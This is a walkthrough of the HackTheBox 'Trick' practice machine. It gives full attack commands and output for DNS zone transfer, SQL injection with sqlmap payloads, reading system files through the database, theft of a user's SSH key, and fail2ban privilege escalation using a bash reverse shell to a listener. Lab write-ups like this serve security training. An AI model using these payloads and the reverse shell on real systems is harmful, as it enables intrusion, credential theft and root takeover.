# Trick HTB Machine Walkthrough

So as with every Machine we will encounter on HackTheBox.. we’ll start it off with an Nmap scan..

---

### Trick HTB Machine Walkthrough

![](https://cdn-images-1.medium.com/max/800/1*nl6IcKn5vw2bvB1wEjj8xw.png)

So as with every Machine we will encounter on HackTheBox.. we’ll start it off with an Nmap scan..

```
nmap -p- 10.10.11.166
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 17:27 EDT
Nmap scan report for 10.10.11.166
Host is up (0.047s latency).
Not shown: 65531 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 38.49 seconds
```

I do a standard all ports scan at first to see what we have, then once we see what ports are open, then i will rerun the scan this time for scripts & version scanning.

```
nmap -p 22,25,53,80 -sC -sV -A -vvv 10.10.11.166
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 17:29 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
Initiating Ping Scan at 17:29
Scanning 10.10.11.166 [4 ports]
Completed Ping Scan at 17:29, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:29
Completed Parallel DNS resolution of 1 host. at 17:29, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 17:29
Scanning 10.10.11.166 [4 ports]
Discovered open port 53/tcp on 10.10.11.166
Discovered open port 80/tcp on 10.10.11.166
Discovered open port 25/tcp on 10.10.11.166
Discovered open port 22/tcp on 10.10.11.166
Completed SYN Stealth Scan at 17:29, 0.12s elapsed (4 total ports)
Initiating Service scan at 17:29
Scanning 4 services on 10.10.11.166
Completed Service scan at 17:29, 10.33s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.166
Initiating Traceroute at 17:29
Completed Traceroute at 17:29, 0.05s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 17:29
Completed Parallel DNS resolution of 2 hosts. at 17:29, 0.04s elapsed
DNS resolution of 2 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.11.166.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 10.27s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 27.44s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
Nmap scan report for 10.10.11.166
Host is up, received echo-reply ttl 63 (0.062s latency).
Scanned at 2025-11-01 17:29:02 EDT for 50s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0=
|   256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm

25/tcp open  smtp    syn-ack ttl 63 Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING

53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian

80/tcp open  http    syn-ack ttl 63 nginx 1.14.2
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Coming Soon - Start Bootstrap Theme
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/1%OT=22%CT=%CU=44011%PV=Y%DS=2%DC=T%G=N%TM=69067BD0
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 9.668 days (since Thu Oct 23 01:27:28 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   45.78 ms 10.10.14.1
2   45.85 ms 10.10.11.166

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.42 seconds
           Raw packets sent: 40 (2.546KB) | Rcvd: 25 (1.789KB)
```

The Nmap scan reveals that ports 22 (SSH), 25 (SMTP), 53 (ISC) and 80 (Nginx) are open. Let’s check the website, see what exactly we’re dealing with.

![](https://cdn-images-1.medium.com/max/800/1*3SvjftCwgndk4KZ-9-GoHQ.png)

So not much here we can work with.. so let’s establish an domain name.. with dig.

```
dig @10.10.11.166 -x 10.10.11.166

; <<>> DiG 9.20.11-4+b1-Debian <<>> @10.10.11.166 -x 10.10.11.166
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23314
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: ce570dffbb6505a42bd90fa9690784b8533b9273fb0c8b87 (good)
;; QUESTION SECTION:
;166.11.10.10.in-addr.arpa. IN PTR

;; ANSWER SECTION:
166.11.10.10.in-addr.arpa. 604800 IN PTR trick.htb.

;; AUTHORITY SECTION:
11.10.10.in-addr.arpa. 604800 IN NS trick.htb.

;; ADDITIONAL SECTION:
trick.htb.  604800 IN A 127.0.0.1
trick.htb.  604800 IN AAAA ::1

;; Query time: 151 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
;; WHEN: Sun Nov 02 11:20:08 EST 2025
;; MSG SIZE  rcvd: 163

```

Alright.. we see Trick.htb.. lets add that to our host file. and now see if we can get lucky with an axfr transfer.

```
echo '10.10.11.166 trick.htb' | sudo tee -a /etc/hosts
```

```

dig @10.10.11.166 axfr trick.htb

; <<>> DiG 9.20.11-4+b1-Debian <<>> @10.10.11.166 axfr trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.  604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.  604800 IN NS trick.htb.
trick.htb.  604800 IN A 127.0.0.1
trick.htb.  604800 IN AAAA ::1
preprod-payroll.trick.htb. 604800 IN CNAME trick.htb.
trick.htb.  604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 99 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Sun Nov 02 11:25:52 EST 2025
;; XFR size: 6 records (messages 1, bytes 231)
```

We see that it worked and we get a new subdomain.. preprod-payroll.trick.htb. So we will add this to our host file just as we did with the first one. Then we will see what we have.

![](https://cdn-images-1.medium.com/max/800/1*FeoCMjj68sRy82sJSYpmZA.png)

We see we get a login form.. so we can try basic creds. to see if any work. admin:admin, admin:admin123, and so forth. but none of those work.

So upon further enumeration. i take a look at the source code (F-12) and see the name employee management payroll system.. so i search google for exploits pertaining to that sytem, this is what we got back.

![](https://cdn-images-1.medium.com/max/800/1*1vA038ZQsD-kZ-GgT_aHpw.png)

![](https://cdn-images-1.medium.com/max/800/1*sqk1f90-VsUyHka_qOrrZw.png)

So we see from there all the attack vectors that possibly could happen. Well that gives me an idea for a SQL Injection attack.. so lets try that in our login form.

![](https://cdn-images-1.medium.com/max/800/1*Oi-_33syOmvzWcXVnlXNWg.png)
<figcaption>type anything in the password section…</figcaption>

That works and we’re in!

![](https://cdn-images-1.medium.com/max/800/1*DTqIBahx2ZdiIntNn0NgtQ.png)

I enumerated the site a little bit and im going to logout and get a basic login request from burpsuite and send that through with SQLMAP and see what we can find..

![](https://cdn-images-1.medium.com/max/800/1*d_c2OjKHUoHnuLEOIPUJ_w.png)
<figcaption>in the request box under that you will right click and select save to file. login.req</figcaption>

From there then we will spin up SQLMAP and enumerate further.

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/Trick]
└─$ sqlmap -r login.req
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:37:43 /2025-11-02/

[12:37:43] [INFO] parsing HTTP request from 'login.req'
[12:37:43] [INFO] resuming back-end DBMS 'mysql'
[12:37:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 4943 FROM (SELECT(SLEEP(5)))BXqg) AND 'EGgP'='EGgP&password=admin

[12:37:44] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[12:37:44] [INFO] fetched data logged to text files under '/home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 12:37:44 /2025-11-02/
```

```
sqlmap -r login.req --risk 3 --level 5  --technique=BEU --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:42:25 /2025-11-02/

[12:42:25] [INFO] parsing HTTP request from 'login.req'
[12:42:25] [INFO] resuming back-end DBMS 'mysql'
[12:42:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin' OR NOT 6545=6545-- UPTu&password=admin

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' OR (SELECT 7824 FROM(SELECT COUNT(*),CONCAT(0x7162626a71,(SELECT (ELT(7824=7824,1))),0x716b706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OIiX&password=admin
---
[12:42:25] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[12:42:25] [INFO] fetched data logged to text files under '/home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 12:42:25 /2025-11-02/
```

Now we will just add — privileges at the end of our sqlmap command to see what we privileges we have.

```
sqlmap -r login.req --risk 3 --level 5  --technique=BEU --batch --privileges
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:57:05 /2025-11-02/

[12:57:05] [INFO] parsing HTTP request from 'login.req'
[12:57:05] [INFO] resuming back-end DBMS 'mysql'
[12:57:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin' OR NOT 6545=6545-- UPTu&password=admin

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' OR (SELECT 7824 FROM(SELECT COUNT(*),CONCAT(0x7162626a71,(SELECT (ELT(7824=7824,1))),0x716b706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OIiX&password=admin
---
[12:57:05] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[12:57:05] [INFO] fetching database users privileges
[12:57:05] [INFO] resumed: ''remo'@'localhost''
[12:57:05] [INFO] resumed: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE

[12:57:05] [INFO] fetched data logged to text files under '/home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 12:57:05 /2025-11-02/
```

Down at the bottom we see we have FILE privileges. so now we can use that to enumerate the backend of this machine.

```
sqlmap -r login.req --risk 3 --level 5  --technique=BEU --batch --privileges --file-read=/etc/passwd
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:59:58 /2025-11-02/

[12:59:58] [INFO] parsing HTTP request from 'login.req'
[12:59:58] [INFO] resuming back-end DBMS 'mysql'
[12:59:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin' OR NOT 6545=6545-- UPTu&password=admin

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' OR (SELECT 7824 FROM(SELECT COUNT(*),CONCAT(0x7162626a71,(SELECT (ELT(7824=7824,1))),0x716b706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OIiX&password=admin
---
[12:59:58] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[12:59:58] [INFO] fetching database users privileges
[12:59:58] [INFO] resumed: ''remo'@'localhost''
[12:59:58] [INFO] resumed: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE

[12:59:58] [INFO] fingerprinting the back-end DBMS operating system
[12:59:58] [INFO] the back-end DBMS operating system is Linux
[12:59:58] [INFO] fetching file: '/etc/passwd'

do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[12:59:58] [INFO] retrieved: '2351'
[12:59:58] [INFO] the local file '/home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (2351 B)
files saved to [1]:
[*] /home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)

[12:59:58] [INFO] fetched data logged to text files under '/home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 12:59:58 /2025-11-02/
```

We see that it has been saved to our system so we can just copy and cat that file..

```
cat /home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<SNIP>
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

so our next step is to just keep trying to find files we can read..

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/Trick]
└─$ sqlmap -r login.req --risk 3 --level 5  --technique=BEU --batch --privileges --file-read=/etc/nginx/sites-enabled/default
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:08:37 /2025-11-02/

[13:08:37] [INFO] parsing HTTP request from 'login.req'
[13:08:37] [INFO] resuming back-end DBMS 'mysql'
[13:08:37] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin' OR NOT 6545=6545-- UPTu&password=admin

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' OR (SELECT 7824 FROM(SELECT COUNT(*),CONCAT(0x7162626a71,(SELECT (ELT(7824=7824,1))),0x716b706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OIiX&password=admin
---
[13:08:38] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:08:38] [INFO] fetching database users privileges
[13:08:38] [INFO] resumed: ''remo'@'localhost''
[13:08:38] [INFO] resumed: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE

[13:08:38] [INFO] fingerprinting the back-end DBMS operating system
[13:08:38] [INFO] the back-end DBMS operating system is Linux
[13:08:38] [INFO] fetching file: '/etc/nginx/sites-enabled/default'
736572766572207B0A096C697374656E2038302064656661756C745F7365727665723B0A096C697374656E205B3A3A5D3A38302064656661756C745F7365727665723B0A097365727665725F6E616D6520747269636B2E6874623B0A09726F6F74202F7661722F7777772F68746D6C3B0A0A09696E64657820696E6465782E68746D6C20696E6465782E68746D20696E6465782E6E67696E782D64656269616E2E68746D6C3B0A0A097365727665725F6E616D65205F3B0A0A096C6F636174696F6E202F207B0A09097472795F66696C6573202475726920247572692F203D3430343B0A097D0A0A096C6F636174696F6E207E205C2E70687024207B0A0909696E636C75646520736E6970706574732F666173746367692D7068702E636F6E663B0A0909666173746367695F7061737320756E69783A2F72756E2F7068702F706870372E332D66706D2E736F636B3B0A097D0A7D0A0A0A736572766572207B0A096C697374656E2038303B0A096C697374656E205B3A3A5D3A38303B0A0A097365727665725F6E616D652070726570726F642D6D61726B6574696E672E747269636B2E6874623B0A0A09726F6F74202F7661722F7777772F6D61726B65743B0A09696E64657820696E6465782E7068703B0A0A096C6F636174696F6E202F207B0A09097472795F66696C6573202475726920247572692F203D3430343B0A097D0A0A20202020202020206C6F636174696F6E207E205C2E70687024207B0A20202020202020202020202020202020696E636C75646520736E6970706574732F666173746367692D7068702E636F6E663B0A20202020202020202020202020202020666173746367695F7061737320756E69783A2F72756E2F7068702F706870372E332D66706D2D6D69636861656C2E736F636B3B0A20202020202020207D0A7D0A0A736572766572207B0A20202020202020206C697374656E2038303B0A20202020202020206C697374656E205B3A3A5D3A38303B0A0A20202020202020207365727665725F6E616D652070726570726F642D706179726F6C6C2E747269636B2E6874623B0A0A2020202020202020726F6F74202F7661722F7777772F706179726F6C6C3B0A2020202020202020696E64657820696E6465782E7068703B0A0A20202020202020206C6F636174696F6E202F207B0A202020202020202020202020202020207472795F66696C6573202475726920247572692F203D3430343B0A20202020202020207D0A0A20202020202020206C6F636174696F6E207E205C2E70687024207B0A20202020202020202020202020202020696E636C75646520736E6970706574732F666173746367692D7068702E636F6E663B0A20202020202020202020202020202020666173746367695F7061737320756E69783A2F72756E2F7068702F706870372E332D66706D2E736F636B3B0
do you want confirmation that the remote file '/etc/nginx/sites-enabled/default' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[13:08:42] [INFO] retrieved: '1058'
[13:08:42] [INFO] the local file '/home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default' and the remote file '/etc/nginx/sites-enabled/default' have the same size (1058 B)
files saved to [1]:
[*] /home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default (same file)

[13:08:42] [INFO] fetched data logged to text files under '/home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 13:08:42 /2025-11-02/
```

Lets open this file and see what we have.

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/Trick]
└─$ cat /home/achilles/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
server {
 listen 80 default_server;
 listen [::]:80 default_server;
 server_name trick.htb;
 root /var/www/html;

 index index.html index.htm index.nginx-debian.html;

 server_name _;

 location / {
  try_files $uri $uri/ =404;
 }

 location ~ \.php$ {
  include snippets/fastcgi-php.conf;
  fastcgi_pass unix:/run/php/php7.3-fpm.sock;
 }
}

server {
 listen 80;
 listen [::]:80;

 server_name preprod-marketing.trick.htb;

 root /var/www/market;
 index index.php;

 location / {
  try_files $uri $uri/ =404;
 }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```

We have another vhost. preprod-marketing.trick.htb.. lets add that to our host file and check that out.

```
──(achilles㉿Nicholas)-[~/HTB/Labs/Trick]
└─$ echo '10.10.11.166 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
[sudo] password for achilles:
10.10.11.166 preprod-marketing.trick.htb
```

![](https://cdn-images-1.medium.com/max/800/1*ubsT7P7xs6lgO-QAIw59Yw.png)

I poke around a bit and see a parameter in the URL that i want to capture a request and further investigate..

![](https://cdn-images-1.medium.com/max/800/1*WjMnrPthOTGrcGHHeLx4Kw.png)

We will open up Burpsuite and grab that request send it to repeater.

![](https://cdn-images-1.medium.com/max/800/1*e7JeOButRFYe9HVC0uoQpA.png)

After a little digging i was able to grab michaels .ssh/id_rsa file. so with that we save it and use it to login to this machine.. out foothold.

![](https://cdn-images-1.medium.com/max/800/1*VvA2JBooImKOH8tgmHoVcA.png)
<figcaption>copy .ssh/id_rsa file and save it.</figcaption>

with a little research we see we can use fail2ban to escalate our privileges to root and grab the root file. We grab the user.txt flag as soon as we sign in.

```
ssh -i michael.key michael@10.10.11.166
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  2 02:16:35 2025 from 10.10.14.4

michael@trick:~$ cat user.txt
5f1470a41955f5f53cd8fd4XXXXX

michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

```
michael@trick:~$ cd /etc/fail2ban/action.d
michael@trick:/etc/fail2ban/action.d$ ls
abuseipdb.conf                       mail.conf
apf.conf                             mail-whois-common.conf
badips.conf                          mail-whois.conf
badips.py                            mail-whois-lines.conf
blocklist_de.conf                    mynetwatchman.conf
bsd-ipfw.conf                        netscaler.conf
cloudflare.conf                      nftables-allports.conf
complain.conf                        nftables-common.conf
dshield.conf                         nftables-multiport.conf
dummy.conf                           nginx-block-map.conf
firewallcmd-allports.conf            npf.conf
firewallcmd-common.conf              nsupdate.conf
firewallcmd-ipset.conf               osx-afctl.conf
firewallcmd-multiport.conf           osx-ipfw.conf
firewallcmd-new.conf                 pf.conf
firewallcmd-rich-logging.conf        route.conf
firewallcmd-rich-rules.conf          sendmail-buffered.conf
helpers-common.conf                  sendmail-common.conf
hostsdeny.conf                       sendmail.conf
ipfilter.conf                        sendmail-geoip-lines.conf
ipfw.conf                            sendmail-whois.conf
iptables-allports.conf               sendmail-whois-ipjailmatches.conf
iptables-common.conf                 sendmail-whois-ipmatches.conf
iptables.conf                        sendmail-whois-lines.conf
iptables-ipset-proto4.conf           sendmail-whois-matches.conf
iptables-ipset-proto6-allports.conf  shorewall.conf
iptables-ipset-proto6.conf           shorewall-ipset-proto6.conf
iptables-multiport.conf              smtp.py
iptables-multiport-log.conf          symbiosis-blacklist-allports.conf
iptables-new.conf                    ufw.conf
iptables-xt_recent-echo.conf         xarf-login-attack.conf
mail-buffered.conf
```

we can use iptables-multiport.conf to trigger a root shell.. so first we will create a file with our reverse shell.

```
michael@trick:/etc/fail2ban/action.d$ vi /dev/shm/shell.sh

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.X/9001 0>&1
```

From this point on we have to be pretty quick cause there is a cron that comes through and cleans up any new file we try to create in this directory..so what we have to do is mv iptables-multiport.conf to iptables-multiport.conf.bak then rm the file from the directory and add the file you just created back into it.. we have to do this cause we have read/write priv in security group so we do this to transfer the file back into michaels diretory so then we can edit the file to insert our /dev/shm/shell.sh file and get our root shell.

```
michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf
michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

restart the service.. now make sure that you have your nc -lvnp 9001 set up in another terminal. and then from another terminal you have to trigger the fail2ban by trying to login in several times usually around 3–5 times

![](https://cdn-images-1.medium.com/max/800/1*saTQbJF1lZr2-4YgyeeGww.png)

![](https://cdn-images-1.medium.com/max/800/1*vqf_bIKyNttEWpzT0LZtvA.png)

